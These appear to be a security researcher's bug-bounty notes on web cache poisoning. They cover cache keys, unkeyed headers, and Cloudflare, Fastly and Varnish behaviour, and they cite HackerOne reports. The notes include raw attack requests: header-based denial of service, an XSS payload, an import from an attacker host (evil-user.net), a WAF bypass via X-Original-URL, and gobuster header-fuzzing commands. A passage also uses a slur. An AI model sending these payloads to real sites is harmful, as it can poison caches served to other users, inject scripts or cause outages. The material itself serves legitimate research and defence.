# Web Cache Poisoning
A cache poisoning attack uses a HTTP request to trick an origin server into 
responding with a **malicious resource** that has the same **cache key** as a legitimate request. 
As a result, the poisoned resource gets cached and served to other users.

# Cache Keys
A CDN/Cache Proxy relies on cache keys to compare new requests against cached resources. 
The CDN then determines whether the resource should be served from the cache or 
requested directly from the origin web server.
[Cloudflare Cache Keys](https://developers.cloudflare.com/cache/how-to/cache-keys/)

# Injecting Payloads with unkeyed inputs 
However, injecting a payload is not the only possible vector for this vulnerability. 
Other possibilities include:
A denial-of-service attack through headers like `x-forwarded-scheme`: 
Using this header generally returns a 302 error to the current page in https. 
If the response is cached, this causes an infinite loop making the page inaccessible.
Using an illegal header such as `\`, which means that the server will respond to a 400 error page. 
If this page is cached, it will be inaccessible to other users.

# Determining where the response should come from
The cache key is a selected set of HTTP request elements 
(parts of the request line and the headers) and their values. 
If all the values in a cache key match those of a previous request, 
the cache assumes it can return the cached response associated with that request, 
without the need to get a new response from the web server. 
Parts of the HTTP request that are included in the cache key are called keyed inputs, 
and the rest are called **unkeyed inputs.** 
Almost all cache keys include at least the path and host, but other header values may also be used. 
Sometimes, only selected parts and parameters of the path are keyed, rather than the entire path

# Cache-control directives
One of the challenges when constructing a web cache poisoning attack is ensuring that the harmful 
response gets cached. This can involve a lot of manual trial and error to study how the cache behaves.
However be on the lookout of cache control directives like `max-age` and `s-maxage` and others which
allows you to easily determine the state of a cache test

    # Examples of Cache-control directives
    HTTP/1.1 200 OK
    Via: 1.1 varnish-v4
    Age: 174
    Cache-Control: public, max-age=1800

See discreet poisoning below.

# Vary Header
The rudimentary way that the Vary header is often used can also provide attackers with a helping hand. 
The **Vary header** specifies a list of additional headers that should be treated as 
part of the cache key even if they are normally unkeyed.
***Note: Some CDNs, such as Cloudflare, ignore the Vary header.***
See Selective Poisoning below.

# Prevention
- Only cache files that are truly static
- Review the caching configuration for your origin web server and ensure you are caching 
files that are static and do not depend on user input in any way. 

    Which file extensions does Cloudflare cache for static content?
    How Do I Tell Cloudflare What to Cache?
    Do not trust data in HTTP headers
    Client-side vulnerabilities are often exploited through HTTP headers, 
    including cross-site scripting (XSS). 
    In general, you should not trust the data in HTTP headers and as such:
    Do not rely on values in HTTP headers if they are not part of your cache key.
    Never return HTTP headers to users in cached content.

# Cache Poisoning Web Apps with HTTP Headers
## Varnish Headers
[Varnish Headers](http://docs.acquia.com/acquia-cloud-platform/varnish-headers)

    Accept_Encoding: br.  Gareth Used this on IG, When Accept-Encoding is in the Cache Key
    X-Forwarded-Port see https://hackerone.com/reports/409370
    X-Forwarded-Host
    X-Forwarded-Proto: http
    X-Forwarded-Server
    X-Host
    X-Original-URL 
    X-Rewrite-URL
    X-Forwarded-SSL
    zTRANSFER-ENCODING: asdf.
    Content-Type: <invalid_value>

    # X-Method-Override: supported by GCP buckets
    X-Method-Override: HEAD if cached, returns an empty response
    X-Method-Override: PURGE, try if enabled.

Find other targets using GCP buckets and test 
Moral of the story, brute force cache poisoning headers 

# x-forwarded-scheme on Rails Applications

    X-Forwarded-Scheme - Rack Middleware
    X-Forwarded-Scheme: http        results into a 301 redirect to the same location.

If the response is cached by a CDN, it would cause a redirect loop, denying access to the file

# TESTING FOR CACHE POISONING

# Using multiple headers to exploit web cache poisoning
    # Max bounty $3k Exploit
    GET /main/static.js HTTP/1.1
    Host: redacted.com
    X-Forwarded-Scheme: https
    X-Forwarded-Host: site_to_redirect_to.com
[Cache Poisoning leads to JS files redirection](https://hackerone.com/reports/1795197)

# x-http-method-override on Fastly and GCS
[X-Http-Method-Override header behavior](https://www.fastly.com/documentation/guides/integrations/non-fastly-services/google-cloud-storage/#x-http-method-override-header-behavior)f
> x-http-method-override: HEAD

# Fastly-Host header injection

    GET /?cb=1 HTTP/1.1
    Host: anything-goes-here.com
    Fastly-Host: legit-host.com

# Top-Tier $9,700 Real World Exploit on PayPal
[DoS on PayPal via web cache poisoning](https://hackerone.com/reports/622122)
[Responsible denial of service with web cache poisoning](https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning)

    GET /?wuhuh=1 HTTP/1.1
    Host: redacted.com
    zTRANSFER-ENCODING: asdf

    HTTP/1.1 501 NOT IMPLEMENTED
    Cache-Control: max-age=900
    X-Cache-Info: cached

# Real World Exploit - Slash Confusion
To be honest, this opens my mind to do further research in to cache poisoning, web cache deception, host header injection, 
in short any kind of vulnerability that relies on causing desyncs between 2 systems. 
Like which kind of a `retard` would think that using the different route handling between Windows and *nix systems 
would cause Origin Server Confusions? That kind of retard, is a shrewd security researcher and that is the kind of 
retard that I want to be. 

    https://cdn.shopify.com/static/javascripts/vendor/bugsnag.v7.4.0.min.js
    https://cdn.shopify.com\static\javascripts\vendor\bugsnag.v7.4.0.min.js
    
https://cpdos.org says it better.

    A general problem in layered systems is the different interpretation when operating on the same message in sequence. 
    As we will discuss in detail in Section 3, this is the root cause for attacks belonging to the family of "semantic gap" attacks. 
    These attacks exploit the difference in interpreting an object by two or more entities. 
    In the context of this paper the problem arises when an attacker can generate an HTTP request for a cacheable resource
    where the request contains inaccurate fields that are ignored by the caching system but raise an error while processed by the origin server. 

Okay, it is called `semantic gap` I would love to research into these types of security issues. I imagine how hard it must be
for the microservices and distributed systems people. 


    # https://hackerone.com/reports/1695604
    GET /static\javascripts\vendor\bugsnag.v7.4.0.min.js?cachebuster=123 HTTP/1.1
    Host: cdn.shopify.com

    # also check X-Forwarded-Proto: http 

    GET /random HTTP/1.1
    Host: innocent-site.com
    X-Forwarded-Proto: http

    HTTP/1.1 301 moved permanently
    Location: https://innocent-site.com/random
    Authorization:        crafted headers      see https://hackerone.com/reports/1173153

# Fastly Cache Poisoning with X-Forwarded-Host and Port Numbers 
[Fastly Cache Poisoning Advisory](https://www.fastly.com/security-advisories/fastly-security-advisory-cache-poisoning-vulnerability-leveraging-x-forwarded-host-header)
[On Fastly cache keys](https://www.fastly.com/blog/getting-most-out-vary-fastly)

# Detecting Fastly 
    GET / HTTP/1.1
    Fastly-Debug: 1 

    # HTTP/1.1 200 OK
    surrogate-control: max-age=86400
    surrogate-key: app_marketing-client-ssr
    age: 268
    fastly-debug-path: (D cache-lis1490042-LIS 1753135014) (F cache-lis1490053-LIS 1753134747)
    fastly-debug-ttl: (H cache-lis1490042-LIS - - 268)
    fastly-debug-digest: 122d2fa6e2b43b7835b40170f1519627da4e81565a25c347f9f7e4765204dcc9
    x-cache: HIT
    x-cache-hits: 1
    x-timer: S1753135014.357746,VS0,VE8

-

    # Attacker Request
    GET / HTTP/1.1
    Host: www.example.com
    X-Forwarded-Host: www.example.com:10000

    # Redirect Response
    HTTP/1.1 302 Found
    Location: https://www.example.com:10000/en
    X-Cache: MISS, MISS

    # Victim Request + Response
    GET / HTTP/1.1
    Host: www.example.com

    HTTP/1.1 302 Found
    Location: https://www.example.com:10000/en
    X-Cache: MISS, HIT

# Bypassing WAF <PHP Frameworks>
    GET /admin HTTP/1.1
    Host: unity.com
    HTTP/1.1 403 Forbidden
    ...
    Access is denied

    GET /anything HTTP/1.1
    Host: unity.com
    X-­Original-­URL: /admin
    HTTP/1.1 200 OK
    ...
    Please log in


# XSS Payload Example
    GET /en?region=uk HTTP/1.1
    Host: innocent-website.com
    X-Forwarded-Host: a."><script>alert(1)</script>"

    HTTP/1.1 200 OK
    Cache-Control: public
    <meta property="og:image" content="https://a."><script>alert(1)</script>"/cms/social.png" />

# Unsafe Handling of resource imports
    GET / HTTP/1.1
    Host: innocent-website.com
    X-Forwarded-Host: evil-user.net

    HTTP/1.1 200 OK
    <script src="https://evil-user.net/static/analytics.js"></script>

# Exploit cookie-handling vulnerabilities
    GET /blog/post.php?mobile=1 HTTP/1.1
    Host: innocent-website.com
    Cookie: language=pl;
Notice the unkeyed cookie language=pl. when cached, and served to 
en-gb users, i.e a mild web cache poisoning

# GET body parameters (fat GET) vulnerabilities
This is where the web app allows GET request 
with body. This is not SPEC compliant and can 
sometimes result in the web server mistakenly fetching 
the body parameters when it was trying to fetch query parameters. 
I hope you get the cache poisoning implication. The Cache Proxy uses the query
parameters as part of the cache key but the returned response was actually 
influenced by the body params. 
Affected [Tornado](https://www.tornadoweb.org/en/stable/)
Since Tornado gives precedence to the body parameters,

## Do not trust GET request bodies
[Cloudflare caches contents of GET request bodies](https://developers.cloudflare.com/cache/cache-security/avoid-web-poisoning/#do-not-trust-get-request-bodies), but they are not included in the cache key. 
GET request bodies should be considered untrusted and should not modify the contents of a response. 
If a GET body can change the contents of a response, consider bypassing cache or using a POST request.

# Sometimes web apps gives precedence to the body parameters
Yeah, right? Super weird. This can lead to the Cache proxy caching 
a resource identified by the body params instead of the query params,
meanwhile the query params becomes part of the cache key, an example of 
what james kettle described in Practical Web Poisoning
[Snyk](https://snyk.io/blog/cache-poisoning-in-popular-open-source-packages/)

# Specific Cache Proxy Behaviors 
## Varnish 
404 and 301 is cached for 15 mins
Max Cache size 10mb 
[Varnish Docs](https://docs.acquia.com/acquia-cloud-platform/using-varnish)

# Web Cache Entanglement
## Discreet Poisoning: 
Timing the resource to determine exactly when a cache expires 
to send a req to potential get a new cache. Headers like max-age offers an insight into when the cache expires. 

## Selective Poisoning: 
HTTP Headers such as Vary tells the front-end which 
other headers should be part of the cache key, even though some CDNs like
cloudflare ignores the Vary header, it means a header in the Vary header
may be part of the cache key, if this is the case, it means you can tailor
the cache poisoning to say people using a specific version of any browser
if the User-Agent is keyed. 

The 'CF-Cache-Status' header here is an indicator that Cloudflare is considering caching this response, but in
spite of this the response was never actually cached. I speculated that Cloudflare's refusal to cache this might be
related to the session_id cookie, and retried with that cookie present:

# Which cache did I poison?
    target.com/cdn-cgi/trace
    # On Resp
    Cache-­Control: max­age=0, private, must­revalidate
    HTTP/1.1 200 OK
    # Bc CF won't cache Cache-­Control: private resp, when you get this,
    # you can try other pages on the site that is cacheable.

# Web Cache Entanglement Prerequisites
Cache Oracle: Cacheable page of the target
Confirmation: The ability to clearly identify if a cache happened.
Ideal: If the Cache O returns the entire URL or at least 1 q qarameters 
Asking Nicely: `Pragma: akamai-x-get-cache-key, akamai-x-get-true-cache-key`

# CloudFlare's Protection
[Cloudflare Cache Poisoning Protection](https://blog.cloudflare.com/cache-poisoning-protection/)
Cloudflare includes ***interesting*** header values in the cache key in hopes to reducing the 
impact of a Cache Poisoning Attack. Headers like X-Forwarded-Host are only added to the Cache Key
when they differ from what’s in the URL or Host header this is for performance gains, as sharded and
look cache keys will impact look up times and cache frequency.
## Cloudflare Cache Key Values
    HTTP Scheme
    HTTP Host
    Path
    Query string
    X-Forwarded-Host header
    X-Host header
    X-Forwarded-Scheme header

# Resources 
[Youstin Cache Key normalization DOS](https://youst.in/posts/cache-key-normalization-denial-of-service/)
[Fastly Header Reference](https://www.fastly.com/documentation/reference/http/http-headers/)
[Snyk Open Source Cache Poisoning Research](https://snyk.io/blog/cache-poisoning-in-popular-open-source-packages/)
# CVE
[Incorrect handling of url fragment leads to cache poisoning](https://www.cve.org/CVERecord?id=CVE-2021-27577)

# Gobuster Fuzzing for Web Cache Poisoning 
    Info: gobuster fuzz --help
    -c, --cookies string   
    -r, --follow-redirect 
    -H, --headers stringArray -H 'Header1: val1' -H 'Header2: val2'
    -m, --method string       Use the following HTTP method (default "GET")
    -P, --password string     Password for Basic Auth
    --proxy string            Proxy to use for requests [http(s)://host:port] or [socks5://host:port]
    --random-agent            Use a random User-Agent string
    -u, --url string          The target URL
    -a, --useragent string    Set the User-Agent string (default "gobuster/3.6")
    -U, --username string     Username for Basic Auth
    -w, --wordlist string       Path to the wordlist. Set to - to use STDIN.
    gobuster fuzz -d example.com -H 'FUZZ' 
    Sending Multiple Headers 
    gobuster fuzz -m GET -u FUZZ/?XCacheBuster=0x7ba -H 'FUZZ' -H 'FUZZ' -w wordlist
    gobuster fuzz -m GET -u <FUZZ : domains.txt>/?XCacheBuster=0x7ba -H 'FUZZ' -H 'FUZZ' -w wordlist
    gobuster fuzz -u example.com/?XCacheBuster=0x7ba -H 'X-Forwarded-Scheme: http' -H 'X-Forwarded-Host: example.com' -w wcp_headers